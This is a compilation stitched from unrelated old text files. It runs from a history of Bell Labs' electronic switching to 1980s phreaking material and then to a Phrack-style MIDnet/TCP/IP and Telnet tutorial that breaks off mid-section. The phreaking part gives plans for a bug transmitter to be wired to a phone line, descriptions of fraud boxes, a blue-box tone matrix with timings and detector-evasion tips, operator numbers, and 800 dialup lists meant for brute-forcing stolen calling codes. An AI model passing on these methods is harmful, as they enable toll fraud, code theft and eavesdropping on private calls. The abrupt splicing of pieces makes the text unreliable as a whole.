efficiency. The first service trial will start in Morris, Ill.,
in 1959." Shortly thereafter, Kappel said that the cost of the
whole project would probably be $45 million.

   But it gradually became apparent that the developement of a
commercially usable electronic switching system - in effect, a
computerized telephone exchange - presented vastly greater
technical problems than had been anticipated, and that,
accordingly, Bell Labs had vastly underestimated both the time
and the investment needed to do the job. The year 1959 passed
without the promised first trial at Morris, Illinois; it was
finally made in November 1960, and quickly showed how much more
work remained to be done. As time dragged on and costs mounted,
there was a concern at AT&T and something approaching panic at
Bell Labs. But the project had to go forward; by this time the
investment was too great to be sacrificed, and in any case,
forward projections of increased demand for telephone service
indicated that within a phew years a time would come when,
without the quantum leap in speed and flexibility that electronic
switching would provide, the national network would be unable to
meet the demand. In November 1963, an all-electronic switching
system went into use at the Brown Engineering Company at Cocoa
Beach, Florida. But this was a small installation, essentially
another test installation, serving only a single company.
Kappel's tone on the subject in the 1964 annual report was, for
him, an almost apologetic: "Electronic switching equipment must
be manufactured in volume to unprecedented standards of
reliability.... To turn out the equipment economically and with
good speed, mass production methods must be developed; but, at
the same time, there can be no loss of precision..." Another year
and millions of dollars later, on May 30, 1965, the first
commercial electric centeral office was put into service at
Succasunna, New Jersey.

   Even at Succasunna, only 200 of the town's 4,300 subscribers
initially had the benefit of electronic switching's added speed
and additional services, such as provision for three party
conversations and automatic transfer of incoming calls. But after
that, ESS was on its way. In January 1966, the second commercial
installation, this one serving 2,900 telephones, went into
service in Chase, Maryland. By the end of 1967 there were
additional ESS offices in California, Connecticut, Minnesota,
Georgia, New York, Florida, and Pennsylvania; by the end of 1970
there were 120 offices serving 1.8 million customers; and by 1974
there were 475 offices serving 5.6 million customers.

   The difference between conventional switching and electronic
switching is the difference between "hardware" and "software"; in
the former case, maintenence is done on the spot, with
screwdriver and pliers, while in the case of electronic
switching, it can be done remotely, by computer, from a centeral
point, making it possible to have only one or two technicians on
duty at a time at each switching center. The development program,
when the final figures were added up, was found to have required
a staggering four thousand man-years of work at Bell Labs and to
have cost not $45 million but $500 million!

other such things. The possibilities are endless. I will also include the plans
or an equally small receiver for your newly made toy. Use it for just about
anything. You can also make the transmitter and receiver together in one box
and use it as a walkie talkie.

Notes about the schematic
=========================

1.  GND means ground
2.  The GND near the switch and the GND by the 2meg potentiometer should be
    connected.
3.  Where you see:  )(
                    ()
                    )( it is the transistor antenna coil with 15 turns of
                       regular hook-up wire around it.
4.  The middle of the loop on the left side (the left of "()") you should run
    a wire down to the "+" which has nothing attached to it. There is a .0047
    capacitor on the correct piece of wire.
5.  For the microphone use a magnetic earphone (1k to 2k).
6.  Where you see "[!]" is the antenna. Use about 8 feet of wire to broadcast
    approx 300ft. Part 15 of the FCC rules and regulation says you can't
    broadcast over 300 feet without a license. (Hahaha). Use more wire for an
    antenna for longer distances. (Attach it to the black wire on the fone
    line for about a 250 foot antenna!)

Operation of the Lunch Box
==========================

This transmitter will send the signals over the AM radio band. You use the
variable capacitor to adjust what freq. you want to use. Find a good unused
freq. down at the lower end of the scale and you're set. Use the 2 meg pot. to
adjust gain. Just fuck with it until you get what sounds good. The switch on
the 2meg is for turning the Lunch Box on and off. When everything is adjusted,
turn on an AM radio adjust it to where you think the signal is. Have a friend
lay some shit thru the Box and tune in to it. That's all there is to it. The
plans for a simple receiver are shown below:

Closing statement
=================

This two devices can be built for under a total of $10.00. Not too bad. Using
these devices in illegal ways is your option. If you get caught, I accept NO
responsibility for your actions. This can be a lot of fun if used correctly.
Hook it up to the red wire on the phone line and it will send the
conversation over the air waves.

Enjoy!

    This is a relatively new box, and all it basically does is serve as a phone
ringer. You have two choices for ringers, a piezoelectric transducer (ringer),
or a standard 8 ohm speaker. The speaker has a more pleasant tone to it, but
either will do fine. This circuit can also be used in conjunction with a rust
box to control an external something or other when the phone rings. Just connect
the 8 ohm speaker output to the inputs on the rust box, and control the pot to
tune it to light the light (which can be replaced by a relay for external
controlling) when the phone rings.

/-/   Phreak Dictionary   /-/
 
     Here you will find some of the basic but necessary terms that should be
known by any phreak who wants to be respected at all.
 
         Phreak  : 1. The action of using mischevious and mostly illegal
                      ways in order to not pay for some sort of tele-
                      communications bill, order, transfer, or other service.
                      It often involves usage of highly illegal boxes and
                      machines in order to defeat the security that is set
                      up to avoid this sort of happening. [fr'eaking]. v.

                   2. A person who uses the above methods of destruction and
                      chaos in order to make a better life for all.  A true
                      phreaker will not not go against his fellows or narc
                      on people who have ragged on him or do anything
                      termed to be dishonorable to phreaks. [fr'eek]. n.

                   3. A certain code or dialup useful in the action of
                      being a phreak. (Example: "I hacked a new metro
                      phreak last night.")
 
 Switching System: 1. There are 3 main switching systems currently employed
                      in the US, and a few other systems will be mentioned
                      as background.

                    A) SxS: This system was invented in 1918 and was
                       employed in over half of the country until 1978. It
                       is a very basic system that is a general waste of
                       energy and hard work on the linesman. A good way to
                       identify this is that it requires a coin in the phone
                       booth before it will give you a dial tone, or that no
                       call waiting, call forwarding, or any other such
                       service is available.  Stands for: Step by Step

                    B) XB: This switching system was first employed in 1978
                       in order to take care of most of the faults of SxS
                       switching.  Not only is it more efficient, but it
                       also can support different services in various forms.
                       XB1 is Crossbar Version 1. That is very limited and
                       is hard to distinguish from SxS except by direct view
                       of the wiring involved. Next up was XB4, Crossbar
                       Version 4. With this system, some of the basic things
                       like DTMF that were not available with SxS can be
                       accomplished. For the final stroke of XB, XB5 was
                       created. This is a service that can allow DTMF plus
                       most 800 type services (which were not always
                       available.) Stands for: Crossbar.

                    C) ESS: A nightmare in telecom. In vivid color, ESS is
                       a pretty bad thing to have to stand up to. It is
                       quite simple to identify. Dialing 911 for emergencies,
                       and ANI [see ANI below] are the most common facets of
                       the dread system. ESS has the capability to list in a
                       person's caller log what number was called, how long
                       the call took, and even the status of the conversation
                       (modem or otherwise.) Since ESS has been employed,
                       which has been very recently, it has gone through
                       many kinds of revisions. The latest system to date is
                       ESS 11a, that is employed in Washington D.C. for
                       security reasons. ESS is truly trouble for any
                       phreak, because it is 'smarter' than the other
                       systems. For instance, if on your caller log they saw
                       50 calls to 1-800-421-9438, they would be able to do
                       a CN/A [see Loopholes below] on your number and
                       determine whether you are subscribed to that service
                       or not. This makes most calls a hazard, because
                       although 800 numbers appear to be free, they are
                       recorded on your caller log and then right before you
                       receive your bill it deletes the billings for them.
                       But before that the are open to inspection, which is
                       one reason why extended use of any code is dangerous
                       under ESS. Some of the boxes [see Boxing below] are
                       unable to function in ESS.  It is generally a menace
                       to the true phreak. Stands For: Electronic Switching
                       System. Because they could appear on a filter
                       somewhere or maybe it is just nice to know them
                       anyways.

                       A) SSS: Strowger Switching System. First
                          non-operator system available.

                       B) WES: Western Electronics Switching. Used about 40
                          years ago with some minor places out west.

            Boxing:  1) The use of personally designed boxes that emit or
                        cancel electronical impulses that allow simpler
                        acting while phreaking. Through the use of separate
                        boxes, you can accomplish most feats possible with
                        or without the control of an operator.

                     2) Some boxes and their functions are listed below.
                        Ones marked with '*' indicate that they are not
                        operatable in ESS.

                      *Black Box: Makes it seem to the phone company that
                                  the phone was never picked up.
                      Blue Box  : Emits a 2600hz tone that allows you to do
                                  such things as stack a trunk line, kick
                                  the operator off line, and others.
                        Red Box : Simulates the noise of a quarter, nickel,
                                  or dime being dropped into a payphone.
                     Cheese Box : Turns your home phone into a pay phone to
                                  throw off traces (a red box is usually
                                  needed in order to call out.)
                     *Clear Box : Gives you a dial tone on some of the old
                                  SxS payphones without putting in a coin.
                      Beige Box : A simpler produced linesman's handset that
                                  allows you to tap into phone lines and
                                  extract by eavesdropping, or crossing
                                  wires, etc.
                     Purple Box : Makes all calls made out from your house
                                  seem to be local calls.

          ANI [ANI]: 1) Automatic Number Identification. A service
                        available on ESS that allows a phone service [see
                        Dialups below] to record the number that any certain
                        code was dialed from along with the number that was
                        called and print both of these on the customer bill.
                        950 dialups [see Dialups below] are all designed
                        just to use ANI. Some of the services do not have
                        the proper equipment to read the ANI impulses yet,
                        but it is impossible to see which is which without
                        being busted or not busted first.

 Dialups [dy'l'ups]: 1) Any local or 800 extended outlet that allows instant
                        access to any service such as MCI, Sprint, or AT&T
                        that from there can be used by handpicking or using
                        a program to reveal other peoples codes which can
                        then be used moderately until they find out about
                        it and you must switch to another code (preferrably
                        before they find out about it.)

                     2) Dialups are extremely common on both senses. Some
                        dialups reveal the company that operates them as
                        soon as you hear the tone. Others are much harder
                        and some you may never be able to identify.  A small
                        list of dialups:

                             1-800-421-9438 (5 digit codes)
                             1-800-547-6754 (6 digit codes)
                             1-800-345-0008 (6 digit codes)
                             1-800-734-3478 (6 digit codes)
                             1-800-222-2255 (5 digit codes)

                     3) Codes: Codes are very easily accessed procedures
                        when you call a dialup. They will give you some sort
                        of tone.  If the tone does not end in 3 seconds,
                        then punch in the code and immediately following the
                        code, the number you are dialing but strike the
                        '1' in the beginning out first. If the tone does
                        end, then punch in the code when the tone ends.
                        Then, it will give you another tone.  Punch in the
                        number you are dialing, or a '9'. If you punch in
                        a '9' and the tone stops, then you messed up a
                        little. If you punch in a tone and the tone
                        continues, then simply dial then number you are
                        calling without the  '1'.

                     4) All codes are not universal. The only type that I
                        know of that is truly universal is Metrophone.
                        Almost every major city has a local Metro dialup
                        (for Philadelphia, (215)351-0100/0126) and since the
                        codes are universal, almost every phreak has used
                        them once or twice. They do not employ ANI in any
                        outlets that I know of, so feel free to check
                        through your books and call 555-1212 or, as a more
                        devious manor, subscribe yourself. Then, never use
                        your own code. That way, if they check up on you due
                        to your caller log, they can usually find out that
                        you are subscribed.  Not only that but you could set
                        a phreak hacker around that area and just let it
                        hack away, since they usually group them, and, as a
                        bonus, you will have their local dialup.

                     5) 950's. They seem like a perfectly cool phreakers
                        dream. They are free from your house, from payphones,
                        from everywhere, and they host all of the major long
                        distance companies (950)1044 <MCI>, 950)1077
                        <Sprint>, 950-1088 <S+ylines>, 950-1033 <Us
                        Telecom>.) Well, they aren't. They were designed for
                        ANI. That is the point, end of discussion.
 
     A phreak dictionary. If you remember all of the things contained on
that fileup there, you may have a better chance of doing whatever it is you
do. This next section is maybe a little more interesting...
 
Blue Box Plans:
---------------
 
     These are some blue box plans, but first, be warned, there have been
2600hz tone detectors out on operator trunk lines since XB4. The idea behind
it is to use a 2600hz tone for a few very naughty functions that can really
make your day lighten up. But first, here are the plans, or the heart of the
file:

700  :   1   :   2   :   4   :   7   :  11   :
900  :   +   :   3   :   5   :   8   :  12   :
1100 :   +   :   +   :   6   :   9   :  KP   :
1300 :   +   :   +   :   +   :  10   :  KP2  :
1500 :   +   :   +   :   +   :   +   :  ST   :
     : 700   : 900   :1100   :1300   :1500   :
 
     Stop! Before you diehard users start piecing those little tone tidbits
together, there is a simpler method. If you have an Apple-Cat with a
program like Cat's Meow IV, then you can generate the necessary tones, the
2600hz tone, the KP tone, the KP2 tone, and the ST tone through the dial
section. So if you have that I will assume you can boot it up and it works,
and I'll do you the favor of telling you and the other users what to do with
the blue box now that you have somehow constructed it. The connection to an
operator is one of the most well known and used ways of having fun with your
blue box. You simply dial a TSPS (Traffic Service Positioning Station, or
the operator you get when you dial '0') and blow a 2600hz tone through the
line. Watch out! Do not dial this direct! After you have done that, it is
quite simple to have fun with it. Blow a KP tone to start a call, a ST tone
to stop it, and a 2600hz tone to hang up. Once you have connected to it,
here are some fun numbers to call with it:

      0-700-456-1000  Teleconference (free, because you are the operator!)
      (Area code)-101 Toll Switching
      (Area code)-121 Local Operator (hehe)
      (Area code)-131 Information
      (Area code)-141 Rate & Route
      (Area code)-181 Coin Refund Operator
      (Area code)-11511 Conference operator (when you dial 800-544-6363)

     Well, those were the tone matrix controllers for the blue box and some
other helpful stuff to help you to start out with. But those are only the
functions with the operator. There are other k-fun things you can do with it.

 More advanced Blue Box Stuff:

     Oops. Small mistake up there. I forgot tone lengths. Um, you blow a
tone pair out for up to 1/10 of a second with another 1/10 second for silence
between the digits. KP tones should be sent for 2/10 of a second. One way to
confuse the 2600hz traps is to send pink noise over the channel (for all of
you that have decent BSR equalizers, there is major pink noise in there.)

     Using the operator functions is the use of the 'inward' trunk line.
Thatis working it from the inside. From the 'outward' trunk, you can do such
things as make emergency breakthrough calls, tap into lines, busy all of the
lines in any trunk (called 'stacking'), enable or disable the TSPS's, and
for some 4a systems you can even re-route calls to anywhere.
 
     All right. The one thing that every complete phreak guide should be
without is blue box plans, since they were once a vital part of phreaking.
Another thing that every complete file needs is a complete listing of all of
the 800 numbers around so you can have some more Fu7nC
 /-/   800 Dialup Listings  /-/
 
1-800-345-0008 (6)   1-800-547-6754 (6)
1-800-245-4890 (4)   1-800-327-9136 (4)
1-800-526-5305 (8)   1-800-858-9000 (3)
1-800-437-9895 (7)   1-800-245-7508 (5)
1-800-343-1844 (4)   1-800-322-1415 (6)
1-800-437-3478 (6)   1-800-325-7222 (6)
 
     All right, set Cat Hacker 1.0 on those numbers and have a fuck of a
day. That is enough with 800 codes, by the time this gets around to you I
dunno what state those codes will be in, but try them all out anyways and
see what you get. On some 800 services now, they have an operator who will
answer and ask you for your code, and then your name. Some will switch back
and forth between voice and tone verification, you can never be quite sure
which you will be upagainst.

     Armed with this knowledge you should be having a pretty good time
phreaking now. But class isn't over yet, there are still a couple important
rules that you should know. If you hear continual clicking on the line, then
you should assume that an operator is messing with something, maybe even
listening in on you. It is a good idea to call someone back when the phone
starts doing that. If you were using a code, use a different code and/or
service to call him back.

     A good way to detect if a code has gone bad or not is to listen when
the number has been dialed. If the code is bad you will probably hear the
phone ringing more clearly and more quickly than if you were using a
different code.  If someone answers voice to it then you can immediately
assume that it is an operative for whatever company you are using. The famed
'311311' code for Metro is one of those. You would have to be quite stupid
to actually respond, because whoever you ask for the operator will always
say 'He's not in right now, can I have him call you back?' and then they
will ask for your name and phone number. Some of the more sophisticated
companies will actually give you a carrier on a line that is supposed to
give you a carrier and then just have garbage flow across the screen like it
would with a bad connection. That is a feeble effort to make you think that
the code is still working and maybe get you to dial someone's voice, a good
test for the carrier trick is to dial anumber that will give you a carrier
that you have never dialed with that code before, that will allow you to
determine whether the code is good or not. For our next section, a lighter
look at some of the things that a phreak should not be without. A vocabulary.
A few months ago, it was a quite strange world for the modem people out
there. But now, a phreaker's vocabulary is essential if you wanna make a
good impression on people when you post what you know about certain subjects.
 
 /-/    Vocabulary    /-/
 
 - Do not misspell except certain exceptions:

             phone -> fone
             freak -> phreak

 - Never substitute 'z's for 's's. (i.e. codez -> codes)

 - Never leave many characters after a post (i.e. Hey Dudes!#!@#@!#!@)

 - NEVER use the 'k' prefix (k-kool, k-rad, k-whatever)

 - Do not abbreviate. (I got lotsa wares w/ docs)

 - Never substitute '0' for 'o' (r0dent, l0zer).

 - Forget about ye old upper case, it looks ruggyish.
 
     All right, that was to relieve the tension of what is being drilled
into your minds at the moment.  Now, however, back to the teaching course.
Here are somethings you should know about phones and billings for phones,
etc.
 
     LATA: Local Access Transference Area. Some people who live in large
cities or areas may be plagued by this problem. For instance, let's say you
live in the 215 area code under the 542 prefix (Ambler, Fort Washington). If
you went to dial in a basic Metro code from that area, for instance,
351-0100, that might not be counted under unlimited local calling because it
is out of your LATA.  For some LATA's, you have to dial a '1' without the
area code before you can dial the phone number. That could prove a hassle
for us all if you didn't realize you would be billed for that sort of call.
In that way, sometimes, it is better to be safe than sorry and phreak.

     The Caller Log: In ESS regions, for every household around, the phone
company has something on you called a Caller Log. This shows every single
number that you dialed, and things can be arranged so it showed every number
that was calling to you. That's one main disadvantage of ESS, it is mostly
computerized so a number scan could be done like that quite easily. Using a
dialup is an easy way to screw that, and is something worth remembering.
Anyways, with the caller log, they check up and see what you dialed. Hmm...
you dialed 15 different 800 numbers that month. Soon they find that you are
subscribed to none of those companies. But that is not the only thing. Most
people would imagine "But wait! 800 numbers don't show up on my phone
bill!". To those people, it is a nice thought, but 800 numbers are picked up
on the caller log until right before they are sent off to you. So they can
check right up on you before they send it away and can note the fact that
you fucked up slightly and called one too many 800 lines.
 
     Right now, after all of that, you should have a pretty good idea of how
to grow up as a good phreak. Follow these guidelines, don't show off, and
don't take unnecessary risks when phreaking or hacking.

If you are not already familiar with NSFnet, I would suggest that you read:

Introduction
~~~~~~~~~~~~
MIDNET is a regional computer network that is part of the NSFnet, the National
Science Foundation Network.  Currently, eleven mid-United States universities
are connected to each other and to the NSFnet via MIDnet:

UA  - University of Arkansas at Fayetteville
ISU - Iowa State University at Ames
UI  - University of Iowa at Iowa City
KSU - Kansas State University at Manhattan
KU  - University of Kansas at Lawrence
UMC - University of Missouri at Columbia
WU  - Washington University at St. Louis, Missouri
UNL - University of Nebraska at Lincoln
OSU - Oklahoma State University at Stillwater
UT  - University of Tulsa (Oklahoma)
OU  - University of Oklahoma at Norman

Researchers at any of these universities that have funded grants can access the
six supercomputer centers funded by the NSF:

John Von Neuman Supercomputer Center
National Center for Atmospheric Research
Cornell National Supercomputer Facility
National Center for Supercomputing Applications
Pittsburgh Supercomputing Center
San Diego Supercomputing Center

In addition, researchers and scientists can communicate with each other over a
vast world-wide computer network that includes the NSFnet, ARPAnet, CSnet,
BITnet, and others that you have read about in The Future Transcendent Saga.
Please refer to "Frontiers" (Phrack Inc., Volume Two, Issue 24, File 4 of 13)
for more details.

MIDnet is just one of several regional computer networks that comprise the
NSFnet system.  Although all of these regional computer networks work the same,
MIDnet is the only one that I have direct access to and so this file is written
from a MIDnet point of view.  For people who have access to the other regional
networks of NSFnet, the only real differences depicted in this file that would
not apply to the other regional networks are the universities that are served
by MIDnet as opposed to:

NYSERnet  in New York State
SURAnet   in the southeastern United States
SEQSUInet in Texas
BARRnet   in the San Francisco area
MERIT     in Michigan

           (There are others that are currently being constructed.)

These regional networks all hook into the NSFnet backbone, which is a network
that connects the six supercomputer centers.  For example, a person at Kansas
State University can connect with a supercomputer via MIDnet and the NSFnet
backbone.  That researcher can also send mail to colleagues at the University
of Delaware by using MIDnet, NSFnet and SURAnet.  Each university has its own
local computer network which connects on-campus computers as well as providing
a means to connecting to a regional network.

Some universities are already connected to older networks such as CSnet, the
ARPAnet and BITnet.  In principal, any campus connected to any of these
networks can access anyone else in any other network since there are gateways
between the networks.

Gateways are specialized computers that forward network traffic, thereby
connecting networks.  In practice, these wide-area networks use different
networking technology which make it impossible to provide full functionality
across the gateways.  However, mail is almost universally supported across all
gateways, so that a person at a BITnet site can send mail messages to a
colleague at an ARPAnet site (or anywhere else for that matter).  You should
already be somewhat familiar with this, but if not refer to;

"Limbo To Infinity" (Phrack Inc., Volume Two, Issue 24, File 3 of 13) and
"Internet Domains" (Phrack Inc., Volume Three, Issue 26, File 8 of 11)

Computer networks rely on hardware and software that allow computers to
communicate.  The language that enables network communication is called a
protocol.  There are many different protocols in use today.  MIDnet uses the
TCP/IP protocols, also known as the DOD (Department of Defense) Protocol Suite.

Other networks that use TCP/IP include ARPAnet, CSnet and the NSFnet.  In fact,
all the regional networks that are linked to the NSFnet backbone are required
to use TCP/IP.  At the local campus level, TCP/IP is often used, although other
protocols such as IBM's SNA and DEC's DECnet are common.  In order to
communicate with a computer via  MIDnet and the NSFnet, a computer at a campus
must use TCP/IP directly or use a gateway that will translate its protocols
into TCP/IP.

The Internet is a world-wide computer network that is the conglomeration of
most of the large wide area networks, including ARPAnet, CSnet, NSFnet, and the
regionals, such as MIDnet.  To a lesser degree, other networks such as BITnet
that can send mail to hosts on these networks are included as part of the
Internet.  This huge network of networks, the Internet, as you have by now read
all about in the pages of Phrack Inc., is a rapidly growing and very complex
entity that allows sophisticated communication between scientists, students,
government officials and others.  Being a part of this community is both
exciting and challenging.

This chapter of the Future Transcendent Saga gives a general description of the
protocols and software used in MIDnet and the NSFNet.  A discussion of several
of the more commonly used networking tools is also included to enable you to
make practical use of the network as soon as possible.


The DOD Protocol Suite
~~~~~~~~~~~~~~~~~~~~~~
The DOD Protocol Suite includes many different protocols.  Each protocol is a
specification of how communication is to occur between computers.  Computer
hardware and software vendors use the protocol to create programs and sometimes
specialized hardware in order to implement the network function intended by the
protocol.  Different implementations of the same protocol exist for the varied
hardware and operating systems found in a network.

The three most commonly used network functions are:

Mail          -- Sending and receiving messages
File Transfer -- Sending and receiving files
Remote Login  -- Logging into a distant computer

Of these, mail is probably the most commonly used.

In the TCP/IP world, there are three different protocols that realize these
functions:

SMTP   -- (Simple Mail Transfer Protocol) Mail
FTP    -- (File Transfer Protocol) sending and receiving files
Telnet -- Remote login

How to use these protocols is discussed in the next section.  At first glance,
it is not obvious why these three functions are the most common.  After all,
mail and file transfer seem to be the same thing.  However, mail messages are
not identical to files, since they are usually comprised of only ASCII
characters and are sequential in structure.  Files may contain binary data and
have complicated, non-sequential structures.  Also, mail messages can usually
tolerate some errors in transmission whereas files should not contain any
errors.  Finally, file transfers usually occur in a secure setting (i.e. The
users who are transferring files know each other's names and passwords and are
permitted to transfer the file, whereas mail can be sent to anybody as long as
their name is known).

While mail and transfer accomplish the transfer of raw information from one
computer to another, Telnet allows a distant user to process that information,
either by logging in to a remote computer or by linking to another terminal.
Telnet is most often used to remotely log in to a distant computer, but it is
actually a general-purpose communications protocol.  I have found it incredibly
useful over the last year.  In some ways, it could be used for a great deal of
access because you can directly connect to another computer anywhere that has
TCP/IP capabilities, however please note that Telnet is *NOT* Telenet.

There are other functions that some networks provide, including the following:

- Name to address translation for networks, computers and people
- The current time
- Quote of the day or fortune
- Printing on a remote printer, or use of any other remote peripheral
- Submission of batch jobs for non-interactive execution
- Dialogues and conferencing between multiple users
- Remote procedure call (i.e. Distributing program execution over several
                              remote computers)
- Transmission of voice or video information

Some of these functions are still in the experimental stages and require faster
computer networks than currently exist.  In the future, new functions will
undoubtedly be invented and existing ones improved.

The DOD Protocol Suite is a layered network architecture, which means that
network functions are performed by different programs that work independently
and in harmony with each other.  Not only are there different programs but
there are different protocols.  The protocols SMTP, FTP and Telnet are
described above.  Protocols have been defined for getting the current time, the
quote of the day, and for translating names.  These protocols are called
applications protocols because users directly interact with the programs that
implement these protocols.

The Transmission Control Protocol, TCP, is used by many of the application
protocols.  Users almost never interact with TCP directly.  TCP establishes a
reliable end-to-end connection between two processes on remote computers.  Data
is sent through a network in small chunks called packets to improve reliability
and performance.  TCP ensures that packets arrive in order and without errors.
If a packet does have errors, TCP requests that the packet be retransmitted.

In turn, TCP calls upon IP, Internet Protocol, to move the data from one
network to another.  IP is still not the lowest layer of the architecture,
since there is usually a "data link layer protocol" below it.  This can be any
of a number of different protocols, two very common ones being X.25 and
Ethernet.

FTP, Telnet and SMTP are called "application protocols", since they are
directly used by applications programs that enable users to make use of the
network.  Network applications are the actual programs that implement these
protocols and provide an interface between the user and the computer.  An
implementation of a network protocol is a program or package of programs that
provides the desired network function such as file transfer.  Since computers
differ from vendor to vendor (e.g. IBM, DEC, CDC), each computer must have its
own implementation of these protocols.  However, the protocols are standardized
so that computers can interoperate over the network (i.e. Can understand and
process each other's data).  For example, a TCP packet generated by an IBM
computer can be read and processed by a DEC computer.

In many instances, network applications programs use the name of the protocol.
For example, the program that transfers files may be called "FTP" and the
program that allows remote logins may be called "Telnet."  Sometimes these
protocols are incorporated into larger packages, as is common with SMTP.  Many
computers have mail programs that allow users on the same computer to send mail
to each other.  SMTP functions are often added to these mail programs so that
users can also send and receive mail through a network.  In such cases, there
is no separate program called SMTP that the user can access, since the mail
program provides the user interface to this network function.

Specific implementation of network protocols, such as FTP, are tailored to the
computer hardware and operating system on which they are used.  Therefore, the
exact user interface varies from one implementation to another.  For example,
the FTP protocol specifies a set of FTP commands which each FTP implementation
must understand and process.  However, these are usually placed at a low level,
often invisible to the user, who is given a higher set of commands to use.

These higher-level commands are not standardized so they may vary from one
implementation of FTP to another.  For some operating systems, not all of these
commands make equal sense, such as "Change Directory," or may have different
meanings.  Therefore the specific user interface that the user sees will
probably differ.

This file describes a generic implementation of the standard TCP/IP application
protocols.  Users must consult local documentation for specifics at their
sites.


Names and Addresses In A Network
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In DOD Protocol Suite, each network is given a unique identifying number.  This
number is assigned by a central authority, namely the Network Information
Center run by SRI, abbreviated as SRI-NIC, in order to prevent more than one
network from having the same network number.  For example, the ARPAnet has
network number 10 while MIDnet has a longer number, namely 128.242.

Each host in a network has a unique identification so other hosts can specify
them unambiguously.  Host numbers are usually assigned by the organization that
manages the network, rather than one central authority.  Host numbers do not
need to be unique throughout the whole Internet but two hosts on the same
network need to have unique host numbers.

The combination of the network number and the host number is called the IP
address of the host and is specified as a 32-bit binary number.  All IP
addresses in the Internet are expressible as 32-bit numbers, although they are
often written in dotted decimal notation.  Dotted decimal notation breaks the
32-bit number into four eight-bit parts or octets and each octet is specified
as a decimal number.  For example, 00000001 is the binary octet that specifies
the decimal number 1, while 11000000 specifies 192.  Dotted decimal notation
makes IP addresses much easier to read and remember.

Computers in the Internet are also identified by hostnames, which are strings
of characters, such as "phrackvax."  However, IP packets must specify the
32-bit IP address instead of the hostname so  some way to translating hostnames
to IP addresses must exist.

One way is to have a table of hostnames and their corresponding IP addresses,
called a hosttable.  Nearly every TCP/IP implementation has such a hosttable,
although the weaknesses of this method are forcing a shift to a new scheme
called the domain name system.  In UNIX systems, the hosttable is often called
"/etc/hosts."  You can usually read this file and find out what the IP
addresses of various hosts are.  Other systems may call this file by a
different name and make it unavailable for public viewing.

Users of computers are generally given accounts to which all charges for
computer use are billed.  Even if computer time is free at an installation,
accounts are used to distinguish between the users and enforce file
protections.  The generic term "username" will be used in this file to refer to
the name by which the computer account is accessed.

In the early days of the ARPAnet which was the first network to use the TCP/IP
protocols, computer users were identified by their username, followed by a
commercial "at" sign (@), followed by the hostname on which the account
existed.  Networks were not given names, per se, although the IP address
specified a network number.

For example, "knight@phrackvax" referred to user "knight" on host "phrackvax."
This did not specify which network "phrackvax" was on, although that
information could be obtained by examining the hosttable and the IP address for
"phrackvax."  (However, "phrackvax" is a ficticious hostname used for this
presentation.)

As time went on, every computer on the network had to have an entry in its
hosttable for every other computer on the network.  When several networks
linked together to form the Internet, the problem of maintaining this central
hosttable got out of hand.  Therefore, the domain name scheme was introduced to
split up the hosttable and make it smaller and easier to maintain.

In the new domain name scheme, users are still identified by their usernames,
but hosts are now identified by their hostname and any and all domains of which
they are a part.  For example, the following address,
"KNIGHT@UMCVMB.MISSOURI.EDU" specifies username "KNIGHT" on host "UMCVMB".
However, host "UMCVMB" is a part of the domain "MISSOURI" " which is in turn
part of the domain "EDU".  There are other domains in "EDU", although only one
is named "MISSOURI".  In the domain "MISSOURI", there is only one host named
"UMCVMB".

However, other domains in "EDU" could theoretically have hosts named "UMCVMB"
(although I would say that this is rather unlikely in this example).  Thus the
combination of hostname and all its domains makes it unique.  The method of
translating such names into IP addresses is no longer as straightforward as
looking up the hostname in a table.  Several protocols and specialized network
software called nameservers and resolvers implement the domain name scheme.

Not all TCP/IP implementations support domain names because it is rather new.
In those cases, the local hosttable provides the only way to translate
hostnames to IP addresses.  The system manager of that computer will have to
put an entry into the hosttable for every host that users may want to connect
to.  In some cases, users may consult the nameserver themselves to find out the
IP address for a given hostname and then use that IP address directly instead
of a hostname.

I have selected a few network hosts to demonstrate how a host system can be
specified by both the hostname and host numerical address.  Some of the nodes I
have selected are also nodes on BITnet, perhaps even some of the others that I
do not make a note of due a lack of omniscent awareness about each and every
single host system in the world :-)

Please Note:  Not every system on BITnet has an IP address.  Likewise, not
              every system that has an IP address is on BITnet.  Also, while
              some locations like Stanford University may have nodes on BITnet
              and have hosts on the IP as well, this does not neccessarily
              imply that the systems on BITnet and on IP (the EDU domain in
              this case) are the same systems.

              Attempts to gain unauthorized access to systems on the Internet
              are not tolerated and is legally a federal offense.  At some
              hosts, they take this very seriously, especially the government
              hosts such as NASA's Goddard Space Flight Center, where they do
              not mind telling you so at the main prompt when you connect to
              their system.

              However, some nodes are public access to an extent.  The DDN
              Network Information Center can be used by anyone.  The server and
              database there have proven to be an invaluable source of
              information when locating people, systems, and other information
              that is related to the Internet.

Telnet

~~~~~~
Remote login refers to logging in to a remote computer from a terminal
connected to a local computer.  Telnet is the standard protocol in the DOD
Protocol Suite for accomplishing this.  The "rlogin" program, provided with
Berkeley UNIX systems and some other systems, also enables remote login.

For purposes of discussion, the "local computer" is the computer to which your
terminal is directly connected while the "remote computer" is the computer on
the network to which you are communicating and to which your terminal is *NOT*
directly connected.

Since some computers use a different method of attaching terminals to
computers, a better definition would be the following:  The "local computer" is
the computer that you are currently using and the "remote computer" is the
computer on the network with which you are or will be communicating.  Note that
the terms "host" and "computer" are synonymous in the following discussion.

To use Telnet, simply enter the command: TELNET

The prompt that Telnet gives is:  Telnet>

(However, you can specify where you want to Telnet to immediately and bypass
the the prompts and other delays by issuing the command:  TELNET [location].)

There is help available by typing in ?.  This prints a list of all the valid
subcommands that Telnet provides with a one-line explanation.

Telnet> ?

To connect to to another computer, use the open subcommand to open a connection
to that computer.  For example, to connect to the host "UMCVMB.MISSOURI.EDU",
do "open umcvmb.missouri.edu"

Telnet will resolve (i.e. Translate, the hostname "umcvmb.missouri.edu" into an
IP address and will send a packet to that host requesting login.  If the remote
host decides to let you attempt a login, it prompts you for your username and
password.  If the host does not respond, Telnet will "time out" (i.e. Wait for
a reasonable amount of time such as 20 seconds) and then terminate with a
message such as "Host not responding."

If your computer does not have an entry for a remote host in its hosttable and
it cannot resolve the name, you can use the IP address explicitly in the telnet
command.  For example,

TELNET 26.0.0.73 (Note:  This is the IP address for the DDN Network Information
                 Center [SRI-NIC.ARPA])

If you are successful in logging in, your terminal is connected to the remote
host.  For all intents and purposes, your terminal is directly hard-wired to
that host and you should be able to do anything on your remote terminal that
you can do at any local terminal.  There are a few exceptions to this rule,
however.

Telnet provides a network escape character, such as CONTROL-T. You can find out
what the escape character is by entering the "status" subcommand:

Telnet> status

You can change the escape character by entering the "escape" subcommand:

Telnet> escape

